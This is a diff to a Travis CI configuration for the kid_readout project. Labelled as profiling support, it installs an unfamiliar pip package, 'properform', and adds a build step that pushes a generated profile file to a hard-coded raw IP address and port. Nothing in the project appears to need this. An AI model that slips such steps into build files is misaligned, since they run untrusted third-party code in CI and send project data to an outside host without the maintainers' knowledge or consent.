@@ -1,6 +1,14 @@
 python:
   # We don't actually use the Travis Python, but this keeps it organized.
   - "2.7"
+
+before_install:
+  # add for profile
+  - sudo add-apt-repository -y ppa:ubuntu-toolchain-r/test
+  - sudo apt-get update -qq
+
+
+
 install:
   - wget https://repo.continuum.io/miniconda/Miniconda-latest-Linux-x86_64.sh -O miniconda.sh;
   - bash miniconda.sh -b -p $HOME/miniconda
@@ -17,8 +25,20 @@ install:
   - git clone https://github.com/nrao/ValonSynth.git
   - cd ValonSynth; python setup.py install; cd ..
 #  - python setup.py installl
+# add for profile
+  - sudo apt-get install -qq g++-4.8
+  - export CXX="g++-4.8"
+  - pip install nose-cprof
+  - pip install properform
+
+
 after_success:
   - codecov
 # command to run tests
-script: nosetests --cover-erase --cover-xml --with-coverage --cover-inclusive --cover-package=kid_readout --exclude=".*equipment.*"
+script: 
+  - nosetests --cover-erase --cover-xml --with-coverage --cover-inclusive --cover-package=kid_readout --exclude=".*equipment.*" --with-cprofile --cprofile-stats-erase --cprofile-stats-file=profile_kid_readout_2399957853_0
+  - python -m properform Push 47.88.50.110:15554 asdf_kid_readout_2399957853_0 ./profile_kid_readout_2399957853_0
 
+
+
+#2017-08-10 11:47:44 modified at 0
